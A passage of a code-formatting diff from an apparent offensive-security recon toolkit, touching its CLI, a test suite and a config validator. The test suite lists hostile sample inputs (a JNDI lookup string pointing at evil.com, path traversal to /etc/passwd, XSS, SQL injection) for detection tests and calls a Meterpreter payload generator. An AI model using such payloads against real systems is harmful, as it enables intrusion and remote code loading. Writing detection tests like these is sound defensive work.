\"--subdomain-only\", action=\"store_true\", help=\"Only run subdomain enumeration\"\n+    )\n+    parser.add_argument(\n+        \"--takeover-only\", action=\"store_true\", help=\"Only check for subdomain takeover\"\n+    )\n+    parser.add_argument(\"--output\", \"-o\", help=\"Output file for results (JSON format)\")\n+    parser.add_argument(\"--verbose\", \"-v\", action=\"store_true\", help=\"Verbose output\")\n+\n     args = parser.parse_args()\n-    \n+\n     # Setup logging\n     if args.verbose:\n         logging.basicConfig(level=logging.DEBUG)\n     else:\n         logging.basicConfig(level=logging.INFO)\n-    \n+\n     # Initialize BCAR\n     bcar = BCARCore()\n-    \n+\n     # Configure scan\n     config = {}\n     if args.ct_only:\n-        config = {'ct_search': True, 'subdomain_enum': False, 'takeover_check': False, \n-                 'port_scan': False, 'tech_detection': False, 'directory_fuzz': False, 'parameter_discovery': False}\n+        config = {\n+            \"ct_search\": True,\n+            \"subdomain_enum\": False,\n+            \"takeover_check\": False,\n+            \"port_scan\": False,\n+            \"tech_detection\": False,\n+            \"directory_fuzz\": False,\n+            \"parameter_discovery\": False,\n+        }\n     elif args.subdomain_only:\n-        config = {'ct_search': False, 'subdomain_enum': True, 'takeover_check': False,\n-                 'port_scan': False, 'tech_detection': False, 'directory_fuzz': False, 'parameter_discovery': False}\n+        config = {\n+            \"ct_search\": False,\n+            \"subdomain_enum\": True,\n+            \"takeover_check\": False,\n+            \"port_scan\": False,\n+            \"tech_detection\": False,\n+            \"directory_fuzz\": False,\n+            \"parameter_discovery\": False,\n+        }\n     elif args.takeover_only:\n-        config = {'ct_search': True, 'subdomain_enum': True, 'takeover_check': True,\n-                 'port_scan': False, 'tech_detection': False, 'directory_fuzz': False, 'parameter_discovery': False}\n-    \n+        config = {\n+            \"ct_search\": True,\n+            \"subdomain_enum\": True,\n+            \"takeover_check\": True,\n+            \"port_scan\": False,\n+            \"tech_detection\": False,\n+            \"directory_fuzz\": False,\n+            \"parameter_discovery\": False,\n+        }\n+\n     # Run scan\n     results = bcar.run_comprehensive_scan(args.domain, config)\n-    \n+\n     # Output results\n     if args.output:\n-        with open(args.output, 'w') as f:\n+        with open(args.output, \"w\") as f:\n             json.dump(results, f, indent=2)\n         print(f\"Results saved to {args.output}\")\n     else:\n         print(json.dumps(results, indent=2))\n \n \n-if __name__ == '__main__':\n-    main()\n\\ No newline at end of file\n+if __name__ == \"__main__\":\n+    main()\n--- /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/comprehensive_test_suite.py\t2025-09-14 19:10:58.549754+00:00\n+++ /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/comprehensive_test_suite.py\t2025-09-14 19:23:09.951401+00:00\n@@ -18,445 +18,508 @@\n from datetime import datetime\n \n # Add current directory to path\n sys.path.insert(0, str(Path(__file__).parent))\n \n+\n class ComprehensiveTestSuite:\n     \"\"\"Comprehensive testing framework for all components\"\"\"\n-    \n+\n     def __init__(self):\n         self.test_results = {}\n         self.start_time = time.time()\n         self.temp_dir = Path(tempfile.mkdtemp(prefix=\"pantheon_test_\"))\n         self.test_target = \"httpbin.org\"  # Safe test target\n-        \n+\n     def log_test(self, test_name: str, status: str, details: str = \"\"):\n         \"\"\"Log test result\"\"\"\n         timestamp = datetime.now().strftime(\"%Y-%m-%d %H:%M:%S\")\n         self.test_results[test_name] = {\n             \"status\": status,\n             \"timestamp\": timestamp,\n-            \"details\": details\n+            \"details\": details,\n         }\n         status_icon = \"\u2705\" if status == \"PASS\" else \"\u274c\" if status == \"FAIL\" else \"\u26a0\ufe0f\"\n         print(f\"{status_icon} {test_name}: {status}\")\n         if details:\n             print(f\"   Details: {details}\")\n-    \n+\n     def test_core_imports(self):\n         \"\"\"Test all core module imports\"\"\"\n         print(\"\\n\ud83d\udd0d Testing Core Module Imports\")\n         print(\"-\" * 50)\n-        \n+\n         modules_to_test = [\n             \"bl4ckc3ll_p4nth30n\",\n-            \"bcar\", \n+            \"bcar\",\n             \"config_validator\",\n             \"error_handler\",\n             \"security_utils\",\n             \"enhanced_validation\",\n-            \"enhanced_scanner\"\n+            \"enhanced_scanner\",\n         ]\n-        \n+\n         for module in modules_to_test:\n             try:\n                 __import__(module)\n                 self.log_test(f\"Import {module}\", \"PASS\")\n             except ImportError as e:\n                 self.log_test(f\"Import {module}\", \"FAIL\", str(e))\n             except Exception as e:\n                 self.log_test(f\"Import {module}\", \"WARN\", f\"Unexpected error: {e}\")\n-    \n+\n     def test_configuration_validation(self):\n         \"\"\"Test configuration loading and validation\"\"\"\n         print(\"\\n\ud83d\udd27 Testing Configuration System\")\n         print(\"-\" * 50)\n-        \n-        try:\n-            import bl4ckc3ll_p4nth30n as main\n-            \n+\n+        try:\n+            import bl4ckc3ll_p4nth30n as main\n+\n             # Test configuration loading\n             cfg = main.load_cfg()\n-            self.log_test(\"Configuration Loading\", \"PASS\", f\"Loaded {len(cfg)} sections\")\n-            \n+            self.log_test(\n+                \"Configuration Loading\", \"PASS\", f\"Loaded {len(cfg)} sections\"\n+            )\n+\n             # Test configuration validation\n             from config_validator import ConfigValidator\n+\n             validator = ConfigValidator()\n-            \n+\n             # Test with valid config\n             valid_result = validator.validate_config(cfg)\n-            self.log_test(\"Valid Config Validation\", \"PASS\" if valid_result[\"valid\"] else \"FAIL\")\n-            \n+            self.log_test(\n+                \"Valid Config Validation\", \"PASS\" if valid_result[\"valid\"] else \"FAIL\"\n+            )\n+\n             # Test with invalid config\n             invalid_cfg = {\"limits\": {\"parallel_jobs\": -1, \"http_timeout\": 99999}}\n             invalid_result = validator.validate_config(invalid_cfg)\n-            self.log_test(\"Invalid Config Detection\", \"PASS\" if not invalid_result[\"valid\"] else \"FAIL\")\n-            \n+            self.log_test(\n+                \"Invalid Config Detection\",\n+                \"PASS\" if not invalid_result[\"valid\"] else \"FAIL\",\n+            )\n+\n         except Exception as e:\n             self.log_test(\"Configuration System\", \"FAIL\", str(e))\n-    \n+\n     def test_input_validation(self):\n         \"\"\"Test input validation and sanitization\"\"\"\n         print(\"\\n\ud83d\udee1\ufe0f Testing Input Validation & Security\")\n         print(\"-\" * 50)\n-        \n-        try:\n-            import bl4ckc3ll_p4nth30n as main\n-            \n+\n+        try:\n+            import bl4ckc3ll_p4nth30n as main\n+\n             # Test domain validation\n             test_cases = [\n                 (\"google.com\", True),\n                 (\"sub.example.org\", True),\n                 (\"invalid..domain\", False),\n                 (\"\", False),\n                 (\"a\" * 300, False),\n                 (\"localhost\", True),\n-                (\"192.168.1.1\", False)  # IP should fail domain validation\n+                (\"192.168.1.1\", False),  # IP should fail domain validation\n             ]\n-            \n+\n             passed = 0\n             for domain, expected in test_cases:\n                 result = main.validate_domain_input(domain)\n                 if result == expected:\n                     passed += 1\n                 else:\n                     print(f\"   Domain validation failed for: {domain}\")\n-            \n-            self.log_test(\"Domain Validation\", \"PASS\" if passed == len(test_cases) else \"FAIL\", \n-                         f\"{passed}/{len(test_cases)} cases passed\")\n-            \n+\n+            self.log_test(\n+                \"Domain Validation\",\n+                \"PASS\" if passed == len(test_cases) else \"FAIL\",\n+                f\"{passed}/{len(test_cases)} cases passed\",\n+            )\n+\n             # Test IP validation\n             ip_cases = [\n                 (\"192.168.1.1\", True),\n                 (\"10.0.0.1\", True),\n                 (\"256.256.256.256\", False),\n                 (\"not-an-ip\", False),\n-                (\"\", False)\n+                (\"\", False),\n             ]\n-            \n+\n             ip_passed = 0\n             for ip, expected in ip_cases:\n                 result = main.validate_ip_input(ip)\n                 if result == expected:\n                     ip_passed += 1\n-                    \n-            self.log_test(\"IP Validation\", \"PASS\" if ip_passed == len(ip_cases) else \"FAIL\",\n-                         f\"{ip_passed}/{len(ip_cases)} cases passed\")\n-            \n+\n+            self.log_test(\n+                \"IP Validation\",\n+                \"PASS\" if ip_passed == len(ip_cases) else \"FAIL\",\n+                f\"{ip_passed}/{len(ip_cases)} cases passed\",\n+            )\n+\n         except Exception as e:\n             self.log_test(\"Input Validation\", \"FAIL\", str(e))\n-    \n+\n     def test_error_handling(self):\n         \"\"\"Test error handling and recovery mechanisms\"\"\"\n         print(\"\\n\ud83d\udea8 Testing Error Handling & Recovery\")\n         print(\"-\" * 50)\n-        \n+\n         try:\n             from error_handler import ErrorRecoveryManager, EnhancedLogger\n-            \n+\n             logger = EnhancedLogger(\"test\")\n             recovery = ErrorRecoveryManager(logger)\n-            \n+\n             # Test retry mechanism\n             attempt_count = 0\n-            \n+\n             @recovery.retry_with_exponential_backoff(max_retries=3)\n             def failing_function():\n                 nonlocal attempt_count\n                 attempt_count += 1\n                 if attempt_count < 3:\n                     raise Exception(\"Temporary failure\")\n                 return \"success\"\n-            \n+\n             result = failing_function()\n-            self.log_test(\"Retry Mechanism\", \"PASS\" if result == \"success\" and attempt_count == 3 else \"FAIL\")\n-            \n+            self.log_test(\n+                \"Retry Mechanism\",\n+                \"PASS\" if result == \"success\" and attempt_count == 3 else \"FAIL\",\n+            )\n+\n             # Test circuit breaker\n             circuit_failures = 0\n-            \n+\n             @recovery.circuit_breaker(failure_threshold=2)\n             def circuit_test():\n                 nonlocal circuit_failures\n                 circuit_failures += 1\n                 if circuit_failures <= 2:\n                     raise Exception(\"Circuit test failure\")\n                 return \"success\"\n-            \n+\n             # Should fail twice then open circuit\n             try:\n                 for i in range(5):\n                     try:\n                         circuit_test()\n                     except Exception as e:\n                         logging.warning(f\"Unexpected error: {e}\")\n-                self.log_test(\"Circuit Breaker\", \"PASS\", \"Circuit opened after failures\")\n+                self.log_test(\n+                    \"Circuit Breaker\", \"PASS\", \"Circuit opened after failures\"\n+                )\n             except Exception as e:\n                 self.log_test(\"Circuit Breaker\", \"FAIL\", str(e))\n-                \n+\n         except Exception as e:\n             self.log_test(\"Error Handling\", \"FAIL\", str(e))\n-    \n+\n     def test_security_features(self):\n         \"\"\"Test security utilities and controls\"\"\"\n         print(\"\\n\ud83d\udd12 Testing Security Features\")\n         print(\"-\" * 50)\n-        \n+\n         try:\n             from security_utils import InputValidator, NetworkValidator, RateLimiter\n-            \n+\n             # Test input sanitization\n             validator = InputValidator()\n-            \n+\n             # Test malicious input detection\n             malicious_inputs = [\n                 \"../../../etc/passwd\",\n                 \"<script>alert('xss')</script>\",\n                 \"'; DROP TABLE users; --\",\n                 \"${jndi:ldap://evil.com/a}\",\n-                \"{{7*7}}\"\n+                \"{{7*7}}\",\n             ]\n-            \n+\n             detected = 0\n             for malicious in malicious_inputs:\n                 if not validator.validate_input(malicious, max_length=100):\n                     detected += 1\n-                    \n-            self.log_test(\"Malicious Input Detection\", \"PASS\" if detected >= 4 else \"FAIL\",\n-                         f\"{detected}/{len(malicious_inputs)} detected\")\n-            \n+\n+            self.log_test(\n+                \"Malicious Input Detection\",\n+                \"PASS\" if detected >= 4 else \"FAIL\",\n+                f\"{detected}/{len(malicious_inputs)} detected\",\n+            )\n+\n             # Test network validation\n             net_validator = NetworkValidator()\n-            \n+\n             # Test private IP detection\n             private_ips = [\"192.168.1.1\", \"10.0.0.1\", \"172.16.0.1\"]\n             public_ips = [\"8.8.8.8\", \"1.1.1.1\"]\n-            \n-            private_detected = sum(1 for ip in private_ips if net_validator.is_private_ip(ip))\n-            public_detected = sum(1 for ip in public_ips if not net_validator.is_private_ip(ip))\n-            \n-            self.log_test(\"Network Classification\", \n-                         \"PASS\" if private_detected == len(private_ips) and public_detected == len(public_ips) else \"FAIL\")\n-            \n+\n+            private_detected = sum(\n+                1 for ip in private_ips if net_validator.is_private_ip(ip)\n+            )\n+            public_detected = sum(\n+                1 for ip in public_ips if not net_validator.is_private_ip(ip)\n+            )\n+\n+            self.log_test(\n+                \"Network Classification\",\n+                (\n+                    \"PASS\"\n+                    if private_detected == len(private_ips)\n+                    and public_detected == len(public_ips)\n+                    else \"FAIL\"\n+                ),\n+            )\n+\n             # Test rate limiting\n             rate_limiter = RateLimiter(max_requests=3, time_window=1)\n-            \n+\n             # Should allow first 3, then block\n             allowed = 0\n             blocked = 0\n-            \n+\n             for i in range(5):\n                 if rate_limiter.is_allowed(\"test_key\"):\n                     allowed += 1\n                 else:\n                     blocked += 1\n-            \n-            self.log_test(\"Rate Limiting\", \"PASS\" if allowed == 3 and blocked == 2 else \"FAIL\",\n-                         f\"Allowed: {allowed}, Blocked: {blocked}\")\n-            \n+\n+            self.log_test(\n+                \"Rate Limiting\",\n+                \"PASS\" if allowed == 3 and blocked == 2 else \"FAIL\",\n+                f\"Allowed: {allowed}, Blocked: {blocked}\",\n+            )\n+\n         except Exception as e:\n             self.log_test(\"Security Features\", \"FAIL\", str(e))\n-    \n+\n     def test_core_functions(self):\n         \"\"\"Test core scanning and analysis functions\"\"\"\n         print(\"\\n\u26a1 Testing Core Functions\")\n         print(\"-\" * 50)\n-        \n-        try:\n-            import bl4ckc3ll_p4nth30n as main\n-            \n+\n+        try:\n+            import bl4ckc3ll_p4nth30n as main\n+\n             # Test certificate transparency search\n             ct_results = main.search_certificate_transparency(\"github.com\")\n-            self.log_test(\"Certificate Transparency\", \"PASS\" if ct_results and len(ct_results) > 0 else \"FAIL\",\n-                         f\"Found {len(ct_results) if ct_results else 0} certificates\")\n-            \n+            self.log_test(\n+                \"Certificate Transparency\",\n+                \"PASS\" if ct_results and len(ct_results) > 0 else \"FAIL\",\n+                f\"Found {len(ct_results) if ct_results else 0} certificates\",\n+            )\n+\n             # Test configuration functions\n             cfg = main.load_cfg()\n-            \n+\n             # Test backup functionality\n             backup_result = main.backup_dependencies()\n             self.log_test(\"Dependency Backup\", \"PASS\" if backup_result else \"FAIL\")\n-            \n+\n             # Test auto-fix functionality\n             autofix_result = main.auto_fix_missing_dependencies()\n-            self.log_test(\"Auto-fix Dependencies\", \"PASS\" if autofix_result else \"WARN\", \"Some tools may be missing\")\n-            \n+            self.log_test(\n+                \"Auto-fix Dependencies\",\n+                \"PASS\" if autofix_result else \"WARN\",\n+                \"Some tools may be missing\",\n+            )\n+\n         except Exception as e:\n             self.log_test(\"Core Functions\", \"FAIL\", str(e))\n-    \n+\n     def test_bcar_integration(self):\n         \"\"\"Test BCAR integration functionality\"\"\"\n         print(\"\\n\ud83e\udd16 Testing BCAR Integration\")\n         print(\"-\" * 50)\n-        \n-        try:\n-            import bl4ckc3ll_p4nth30n as main\n-            \n+\n+        try:\n+            import bl4ckc3ll_p4nth30n as main\n+\n             if main.BCAR_AVAILABLE:\n                 from bcar import PantheonBCARIntegration\n-                \n+\n                 integration = PantheonBCARIntegration()\n-                \n+\n                 # Test payload generation\n                 payloads = integration.generate_meterpreter_payloads(\"127.0.0.1\", 4444)\n                 self.log_test(\"BCAR Payload Generation\", \"PASS\" if payloads else \"FAIL\")\n-                \n+\n                 # Test reconnaissance integration\n                 recon_data = integration.enhanced_reconnaissance(\"example.com\")\n                 self.log_test(\"BCAR Reconnaissance\", \"PASS\" if recon_data else \"FAIL\")\n-                \n-                self.log_test(\"BCAR Integration\", \"PASS\", \"All BCAR functions operational\")\n+\n+                self.log_test(\n+                    \"BCAR Integration\", \"PASS\", \"All BCAR functions operational\"\n+                )\n             else:\n                 self.log_test(\"BCAR Integration\", \"WARN\", \"BCAR module not available\")\n-                \n+\n         except Exception as e:\n             self.log_test(\"BCAR Integration\", \"FAIL\", str(e))\n-    \n+\n     def test_resource_management(self):\n         \"\"\"Test resource usage and management\"\"\"\n         print(\"\\n\ud83d\udcca Testing Resource Management\")\n         print(\"-\" * 50)\n-        \n+\n         try:\n             import psutil\n             import bl4ckc3ll_p4nth30n as main\n-            \n+\n             # Test system monitoring\n             initial_memory = psutil.Process().memory_info().rss\n-            \n+\n             # Run some operations\n             cfg = main.load_cfg()\n             ct_results = main.search_certificate_transparency(\"example.com\")\n-            \n+\n             final_memory = psutil.Process().memory_info().rss\n             memory_increase = final_memory - initial_memory\n-            \n+\n             # Memory increase should be reasonable (less than 50MB for basic operations)\n-            self.log_test(\"Memory Usage\", \"PASS\" if memory_increase < 50 * 1024 * 1024 else \"WARN\",\n-                         f\"Memory increase: {memory_increase // 1024} KB\")\n-            \n+            self.log_test(\n+                \"Memory Usage\",\n+                \"PASS\" if memory_increase < 50 * 1024 * 1024 else \"WARN\",\n+                f\"Memory increase: {memory_increase // 1024} KB\",\n+            )\n+\n             # Test CPU usage\n             cpu_percent = psutil.Process().cpu_percent(interval=1)\n-            self.log_test(\"CPU Usage\", \"PASS\" if cpu_percent < 50 else \"WARN\", f\"CPU: {cpu_percent}%\")\n-            \n+            self.log_test(\n+                \"CPU Usage\",\n+                \"PASS\" if cpu_percent < 50 else \"WARN\",\n+                f\"CPU: {cpu_percent}%\",\n+            )\n+\n         except Exception as e:\n             self.log_test(\"Resource Management\", \"FAIL\", str(e))\n-    \n+\n     def test_edge_cases(self):\n         \"\"\"Test edge cases and error conditions\"\"\"\n         print(\"\\n\ud83c\udfaf Testing Edge Cases\")\n         print(\"-\" * 50)\n-        \n-        try:\n-            import bl4ckc3ll_p4nth30n as main\n-            \n+\n+        try:\n+            import bl4ckc3ll_p4nth30n as main\n+\n             # Test with empty/invalid inputs\n             edge_cases = [\n                 (\"\", \"empty string\"),\n                 (None, \"none value\"),\n                 (\"a\" * 1000, \"very long string\"),\n                 (\"localhost\", \"localhost\"),\n                 (\"0.0.0.0\", \"null IP\"),\n-                (\"255.255.255.255\", \"broadcast IP\")\n+                (\"255.255.255.255\", \"broadcast IP\"),\n             ]\n-            \n+\n             robust_functions = 0\n             total_tests = 0\n-            \n+\n             for test_input, description in edge_cases:\n                 total_tests += 1\n                 try:\n                     # Test domain validation with edge case\n                     if isinstance(test_input, str):\n                         result = main.validate_domain_input(test_input)\n                         robust_functions += 1  # If no exception, function is robust\n                 except Exception as e:\n                     print(f\"   Edge case failed: {description} - {e}\")\n-            \n-            self.log_test(\"Edge Case Robustness\", \n-                         \"PASS\" if robust_functions >= total_tests * 0.8 else \"WARN\",\n-                         f\"{robust_functions}/{total_tests} tests handled gracefully\")\n-            \n+\n+            self.log_test(\n+                \"Edge Case Robustness\",\n+                \"PASS\" if robust_functions >= total_tests * 0.8 else \"WARN\",\n+                f\"{robust_functions}/{total_tests} tests handled gracefully\",\n+            )\n+\n         except Exception as e:\n             self.log_test(\"Edge Cases\", \"FAIL\", str(e))\n-    \n+\n     def test_concurrent_operations(self):\n         \"\"\"Test concurrent operation handling\"\"\"\n         print(\"\\n\ud83d\udd04 Testing Concurrent Operations\")\n         print(\"-\" * 50)\n-        \n+\n         try:\n             import bl4ckc3ll_p4nth30n as main\n             import threading\n-            \n+\n             results = []\n             errors = []\n-            \n+\n             def worker_function(worker_id):\n                 try:\n                     # Each worker performs some operations\n                     cfg = main.load_cfg()\n-                    ct_results = main.search_certificate_transparency(f\"worker{worker_id}.com\")\n+                    ct_results = main.search_certificate_transparency(\n+                        f\"worker{worker_id}.com\"\n+                    )\n                     results.append(f\"Worker {worker_id} completed\")\n                 except Exception as e:\n                     errors.append(f\"Worker {worker_id} failed: {e}\")\n-            \n+\n             # Start multiple workers\n             threads = []\n             for i in range(5):\n                 thread = threading.Thread(target=worker_function, args=(i,))\n                 threads.append(thread)\n                 thread.start()\n-            \n+\n             # Wait for completion\n             for thread in threads:\n                 thread.join(timeout=10)\n-            \n-            self.log_test(\"Concurrent Operations\", \n-                         \"PASS\" if len(errors) == 0 else \"WARN\",\n-                         f\"Completed: {len(results)}, Errors: {len(errors)}\")\n-            \n+\n+            self.log_test(\n+                \"Concurrent Operations\",\n+                \"PASS\" if len(errors) == 0 else \"WARN\",\n+                f\"Completed: {len(results)}, Errors: {len(errors)}\",\n+            )\n+\n         except Exception as e:\n             self.log_test(\"Concurrent Operations\", \"FAIL\", str(e))\n-    \n+\n     def test_performance_benchmarks(self):\n         \"\"\"Test performance benchmarks\"\"\"\n         print(\"\\n\u26a1 Testing Performance Benchmarks\")\n         print(\"-\" * 50)\n-        \n-        try:\n-            import bl4ckc3ll_p4nth30n as main\n-            \n+\n+        try:\n+            import bl4ckc3ll_p4nth30n as main\n+\n             # Benchmark configuration loading\n             start_time = time.time()\n             for i in range(10):\n                 cfg = main.load_cfg()\n             config_time = (time.time() - start_time) / 10\n-            \n-            self.log_test(\"Config Load Performance\", \n-                         \"PASS\" if config_time < 0.1 else \"WARN\",\n-                         f\"Average: {config_time:.3f}s per load\")\n-            \n+\n+            self.log_test(\n+                \"Config Load Performance\",\n+                \"PASS\" if config_time < 0.1 else \"WARN\",\n+                f\"Average: {config_time:.3f}s per load\",\n+            )\n+\n             # Benchmark certificate transparency search\n             start_time = time.time()\n             ct_results = main.search_certificate_transparency(\"github.com\")\n             ct_time = time.time() - start_time\n-            \n-            self.log_test(\"CT Search Performance\",\n-                         \"PASS\" if ct_time < 5.0 else \"WARN\",\n-                         f\"Time: {ct_time:.3f}s\")\n-            \n+\n+            self.log_test(\n+                \"CT Search Performance\",\n+                \"PASS\" if ct_time < 5.0 else \"WARN\",\n+                f\"Time: {ct_time:.3f}s\",\n+            )\n+\n         except Exception as e:\n             self.log_test(\"Performance Benchmarks\", \"FAIL\", str(e))\n-    \n+\n     def run_comprehensive_tests(self):\n         \"\"\"Run all comprehensive tests\"\"\"\n         print(\"\ud83c\udfaf BL4CKCE3LL PANTHEON COMPREHENSIVE TEST SUITE\")\n         print(\"=\" * 80)\n         print(f\"Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\")\n         print(f\"Test Directory: {self.temp_dir}\")\n         print()\n-        \n+\n         test_methods = [\n             self.test_core_imports,\n             self.test_configuration_validation,\n             self.test_input_validation,\n             self.test_error_handling,\n@@ -464,91 +527,101 @@\n             self.test_core_functions,\n             self.test_bcar_integration,\n             self.test_resource_management,\n             self.test_edge_cases,\n             self.test_concurrent_operations,\n-            self.test_performance_benchmarks\n+            self.test_performance_benchmarks,\n         ]\n-        \n+\n         for test_method in test_methods:\n             try:\n                 test_method()\n             except Exception as e:\n                 print(f\"\u274c TEST METHOD FAILED: {test_method.__name__}\")\n                 print(f\"   Error: {e}\")\n                 print(f\"   Traceback: {traceback.format_exc()}\")\n-        \n+\n         self.generate_summary_report()\n-    \n+\n     def generate_summary_report(self):\n         \"\"\"Generate comprehensive test summary\"\"\"\n         print(\"\\n\" + \"=\" * 80)\n         print(\"\ud83d\udccb COMPREHENSIVE TEST SUMMARY\")\n         print(\"=\" * 80)\n-        \n+\n         total_tests = len(self.test_results)\n         passed = sum(1 for r in self.test_results.values() if r[\"status\"] == \"PASS\")\n         failed = sum(1 for r in self.test_results.values() if r[\"status\"] == \"FAIL\")\n         warnings = sum(1 for r in self.test_results.values() if r[\"status\"] == \"WARN\")\n-        \n+\n         print(f\"Total Tests: {total_tests}\")\n         print(f\"\u2705 Passed: {passed}\")\n         print(f\"\u274c Failed: {failed}\")\n         print(f\"\u26a0\ufe0f Warnings: {warnings}\")\n         print(f\"Success Rate: {(passed/total_tests)*100:.1f}%\")\n-        \n+\n         elapsed_time = time.time() - self.start_time\n         print(f\"Elapsed Time: {elapsed_time:.1f}s\")\n-        \n+\n         # Detailed results\n         print(f\"\\n\ud83d\udcca DETAILED RESULTS:\")\n         print(\"-\" * 50)\n         for test_name, result in self.test_results.items():\n-            status_icon = \"\u2705\" if result[\"status\"] == \"PASS\" else \"\u274c\" if result[\"status\"] == \"FAIL\" else \"\u26a0\ufe0f\"\n+            status_icon = (\n+                \"\u2705\"\n+                if result[\"status\"] == \"PASS\"\n+                else \"\u274c\" if result[\"status\"] == \"FAIL\" else \"\u26a0\ufe0f\"\n+            )\n             print(f\"{status_icon} {test_name:<35} {result['status']}\")\n             if result.get(\"details\"):\n                 print(f\"     \u2514\u2500\u2500 {result['details']}\")\n-        \n+\n         # Generate recommendations\n         print(f\"\\n\ud83d\udca1 RECOMMENDATIONS:\")\n         print(\"-\" * 30)\n         if failed > 0:\n             print(\"\ud83d\udd27 Address failed tests to improve system reliability\")\n         if warnings > 0:\n             print(\"\u26a0\ufe0f Review warnings for potential optimizations\")\n-        \n+\n         security_score = (passed / total_tests) * 100\n         if security_score >= 90:\n             print(\"\ud83c\udf89 EXCELLENT: System is highly robust and secure\")\n         elif security_score >= 75:\n             print(\"\u2705 GOOD: System is stable with minor issues\")\n         elif security_score >= 60:\n             print(\"\u26a0\ufe0f NEEDS ATTENTION: Several issues need resolution\")\n         else:\n             print(\"\u274c CRITICAL: System needs significant improvements\")\n-        \n+\n         # Save detailed report\n         report_file = self.temp_dir / \"comprehensive_test_report.json\"\n-        with open(report_file, 'w') as f:\n-            json.dump({\n-                \"summary\": {\n-                    \"total\": total_tests,\n-                    \"passed\": passed,\n-                    \"failed\": failed,\n-                    \"warnings\": warnings,\n-                    \"success_rate\": (passed/total_tests)*100,\n-                    \"elapsed_time\": elapsed_time\n+        with open(report_file, \"w\") as f:\n+            json.dump(\n+                {\n+                    \"summary\": {\n+                        \"total\": total_tests,\n+                        \"passed\": passed,\n+                        \"failed\": failed,\n+                        \"warnings\": warnings,\n+                        \"success_rate\": (passed / total_tests) * 100,\n+                        \"elapsed_time\": elapsed_time,\n+                    },\n+                    \"results\": self.test_results,\n                 },\n-                \"results\": self.test_results\n-            }, f, indent=2)\n-        \n+                f,\n+                indent=2,\n+            )\n+\n         print(f\"\\n\ud83d\udcc4 Detailed report saved to: {report_file}\")\n         print(f\"\ud83d\uddc2\ufe0f Test artifacts in: {self.temp_dir}\")\n+\n \n def main():\n     \"\"\"Main test runner\"\"\"\n     test_suite = ComprehensiveTestSuite()\n     test_suite.run_comprehensive_tests()\n     return 0\n \n+\n if __name__ == \"__main__\":\n-    sys.exit(main())\n\\ No newline at end of file\n+    sys.exit(main())\n--- /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/config_validator.py\t2025-09-14 19:10:58.549754+00:00\n+++ /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/config_validator.py\t2025-09-14 19:23:10.053751+00:00\n@@ -10,264 +10,336 @@\n from pathlib import Path\n \n \n class ConfigValidator:\n     \"\"\"Validates configuration files and settings\"\"\"\n-    \n+\n     def __init__(self):\n         self.validation_rules = {\n-            'limits': {\n-                'parallel_jobs': {'type': int, 'min': 1, 'max': 100},\n-                'http_timeout': {'type': int, 'min': 1, 'max': 300},\n-                'max_results': {'type': int, 'min': 1, 'max': 100000, 'optional': True},\n-                'rate_limit': {'type': float, 'min': 0.1, 'max': 10.0, 'optional': True},\n-                'rps': {'type': int, 'min': 1, 'max': 10000, 'optional': True},\n-                'max_concurrent_scans': {'type': int, 'min': 1, 'max': 50, 'optional': True},\n-                'retry_attempts': {'type': int, 'min': 1, 'max': 10, 'optional': True},\n-                'max_retries': {'type': int, 'min': 1, 'max': 10, 'optional': True},\n-                'backoff_delay': {'type': (int, float), 'min': 0.1, 'max': 60, 'optional': True},\n-                'scan_depth': {'type': int, 'min': 1, 'max': 10, 'optional': True}\n-            },\n-            'nuclei': {\n-                'severity': {'type': (list, str), 'allowed_values': ['critical', 'high', 'medium', 'low', 'info']},\n-                'update_interval': {'type': int, 'min': 1, 'max': 168, 'optional': True},\n-                'custom_templates': {'type': bool, 'optional': True},\n-                'enabled': {'type': bool, 'optional': True},\n-                'rps': {'type': int, 'min': 1, 'max': 10000, 'optional': True},\n-                'conc': {'type': int, 'min': 1, 'max': 500, 'optional': True},\n-                'timeout': {'type': int, 'min': 1, 'max': 300, 'optional': True},\n-                'retries': {'type': int, 'min': 0, 'max': 10, 'optional': True},\n-                'all_templates': {'type': bool, 'optional': True}\n-            },\n-            'report': {\n-                'format': {'type': list, 'allowed_values': ['html', 'json', 'csv', 'xml'], 'optional': True},\n-                'formats': {'type': list, 'allowed_values': ['html', 'json', 'csv', 'xml'], 'optional': True},\n-                'include_screenshots': {'type': bool, 'optional': True},\n-                'detailed_analysis': {'type': bool, 'optional': True}\n-            },\n-            'repos': {\n-                'seclists': {'type': str, 'pattern': r'^https?://.*', 'optional': True},\n-                'payloads': {'type': str, 'pattern': r'^https?://.*', 'optional': True},\n-                'wordlists': {'type': str, 'pattern': r'^https?://.*', 'optional': True},\n-                'SecLists': {'type': str, 'pattern': r'^https?://.*', 'optional': True},\n-                'PayloadsAllTheThings': {'type': str, 'pattern': r'^https?://.*', 'optional': True},\n-                'Wordlists': {'type': str, 'pattern': r'^https?://.*', 'optional': True},\n-                'NucleiTemplates': {'type': str, 'pattern': r'^https?://.*', 'optional': True},\n-                'Exploits': {'type': str, 'pattern': r'^https?://.*', 'optional': True}\n+            \"limits\": {\n+                \"parallel_jobs\": {\"type\": int, \"min\": 1, \"max\": 100},\n+                \"http_timeout\": {\"type\": int, \"min\": 1, \"max\": 300},\n+                \"max_results\": {\"type\": int, \"min\": 1, \"max\": 100000, \"optional\": True},\n+                \"rate_limit\": {\n+                    \"type\": float,\n+                    \"min\": 0.1,\n+                    \"max\": 10.0,\n+                    \"optional\": True,\n+                },\n+                \"rps\": {\"type\": int, \"min\": 1, \"max\": 10000, \"optional\": True},\n+                \"max_concurrent_scans\": {\n+                    \"type\": int,\n+                    \"min\": 1,\n+                    \"max\": 50,\n+                    \"optional\": True,\n+                },\n+                \"retry_attempts\": {\"type\": int, \"min\": 1, \"max\": 10, \"optional\": True},\n+                \"max_retries\": {\"type\": int, \"min\": 1, \"max\": 10, \"optional\": True},\n+                \"backoff_delay\": {\n+                    \"type\": (int, float),\n+                    \"min\": 0.1,\n+                    \"max\": 60,\n+                    \"optional\": True,\n+                },\n+                \"scan_depth\": {\"type\": int, \"min\": 1, \"max\": 10, \"optional\": True},\n+            },\n+            \"nuclei\": {\n+                \"severity\": {\n+                    \"type\": (list, str),\n+                    